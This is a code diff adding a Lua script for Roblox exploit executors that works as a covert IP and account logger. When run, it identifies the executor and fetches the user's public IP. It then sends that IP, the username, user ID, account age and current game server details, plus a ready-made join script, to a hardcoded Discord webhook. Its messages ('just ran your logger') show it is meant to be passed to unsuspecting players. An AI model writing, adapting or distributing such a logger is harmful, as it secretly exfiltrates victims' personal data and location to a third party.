@@ -1,0 +1,70 @@
+api:set_lua_name("unnamed_logger")
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Wait for game to fully load
+repeat task.wait() until game:IsLoaded()
+
+-- Generate join script
+local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
+
+-- Executor detection (updated)
+local webhookcheck = 
+    is_sirhurt_closure and "Sirhurt" or 
+    pebc_execute and "ProtoSmasher" or 
+    syn and "Synapse X" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl" or
+    SONA_LOADED and "Sona" or
+    FLUXUS_LOADED and "Fluxus" or
+    getexecutorname and getexecutorname() or
+    identifyexecutor and identifyexecutor() or
+    "Unknown Executor"
+
+-- Get IP info
+local ipInfo = game:HttpGet("https://api.ipify.org")
+
+local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+local url = "https://discord.com/api/webhooks/1447301967725727816/C3pN2P51PboUSkn1fHMaYgTXhiLQ7qzz1499_8SurueGYKb8LP-aroCTRUupisruuAqZ"
+
+local data = {
+    ["username"] = "Salmon-L0G",
+    ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png",
+    ["content"] = "💀💀 **" .. LocalPlayer.Name .. "** is using your neck grabs",
+    ["embeds"] = {
+        {
+            ["title"] = "**" .. LocalPlayer.Name .. " just ran your logger**",
+            ["description"] = "**IP: " .. ipInfo .. " | Username: " .. LocalPlayer.Name .. " | Uses: " .. webhookcheck .. "**",
+            ["type"] = "rich",
+            ["color"] = 14680319,
+            ["fields"] = {
+                {name = "👤 Username", value = LocalPlayer.Name, inline = true},
+                {name = "📛 Display Name", value = LocalPlayer.DisplayName, inline = true},
+                {name = "🆔 User ID", value = tostring(LocalPlayer.UserId), inline = true},
+                {name = "📅 Account Age", value = tostring(LocalPlayer.AccountAge) .. " days", inline = true},
+                {name = "⚙️ Executor", value = webhookcheck, inline = true},
+                {name = "🎯 Game", value = game.Name, inline = false},
+                {name = "🏠 Place ID", value = tostring(game.PlaceId), inline = true},
+                {name = "🔑 Job ID", value = game.JobId, inline = true},
+            },
+            ["footer"] = {
+                ["text"] = join_script
+            },
+            ["timestamp"] = timestamp
+        }
+    }
+}
+
+local newdata = HttpService:JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+api:on_event("unload", function() end)
